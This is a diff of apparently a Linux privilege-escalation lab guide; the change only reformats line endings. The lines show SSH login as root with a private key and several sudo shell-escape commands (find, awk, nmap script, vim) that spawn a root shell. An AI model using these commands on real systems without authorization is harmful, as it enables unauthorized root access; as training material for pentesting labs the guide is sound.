@@ -76,8 +76,8 @@ Now:
 
 **Attacker box**
 
-1. In command prompt type: `chmod 400 id_rsa`
-2. In command prompt type: `ssh -i id_rsa root@<ip>`
+1. In command prompt type: `chmod 400 id_rsa`  
+2. In command prompt type: `ssh -i id_rsa root@<ip>`  
 
 # 6. Privilage Escalation - Sudo ( Shell Escaping )
 ## Detection
@@ -85,11 +85,11 @@ Now:
 2. From the output, notice the list of programs that can run via sudo. 
 
 ## Exploitation
-1. In command prompt type any of the following:
-a. `sudo find /bin -name nano -exec /bin/sh \;`
-b. `sudo awk 'BEGIN {system("/bin/sh")}'`
-c. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
-d. `sudo vim -c '!sh' `
+1. In command prompt type any of the following:  
+a. `sudo find /bin -name nano -exec /bin/sh \;`  
+b. `sudo awk 'BEGIN {system("/bin/sh")}'`  
+c. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`  
+d. `sudo vim -c '!sh' `  
 
 # 7. Privilage Escalation - Sudo (Abusing Intended Functionality)
 ## Detection
